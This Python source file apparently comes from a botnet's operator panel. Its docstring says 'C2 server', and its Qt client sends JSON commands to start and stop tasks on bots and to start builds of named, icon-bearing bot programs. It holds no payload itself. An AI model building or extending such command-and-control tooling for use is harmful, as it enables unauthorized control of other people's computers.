from qtpy.QtCore import Slot

from QtPyNetwork.client import QThreadedClient


class GUIClient(QThreadedClient):
    """C2 server."""

    def __init__(self):
        super(GUIClient, self).__init__(loggerName=self.__class__.__name__)

    @Slot(int, int)
    def stop_task(self, bot_id, task_id):
        self.write({"event_type": "task",
                    "bot_id": bot_id,
                    "task_id": task_id,
                    "event": "stop"})

    @Slot(int, str, dict, int)
    def send_task(self, bot_id, task, kwargs, user_activity):
        self.write({"event_type": "task",
                    "bot_id": bot_id,
                    "task": task,
                    "kwargs": kwargs,
                    "user_activity": user_activity,
                    "event": "start"})

    @Slot()
    def get_tasks(self):
        self.write({"event_type": "task",
                    "event": "options"})

    @Slot()
    def get_build_options(self):
        self.write({"event_type": "build",
                    "event": "options"})

    @Slot(str, str, list)
    def start_build(self, name, icon, generators):
        self.write({"event_type": "build",
                    "event": "start",
                    "name": name,
                    "icon": icon,
                    "generators": generators})

    @Slot()
    def stop_build(self):
        self.write({"event_type": "build",
                    "event": "stop"})
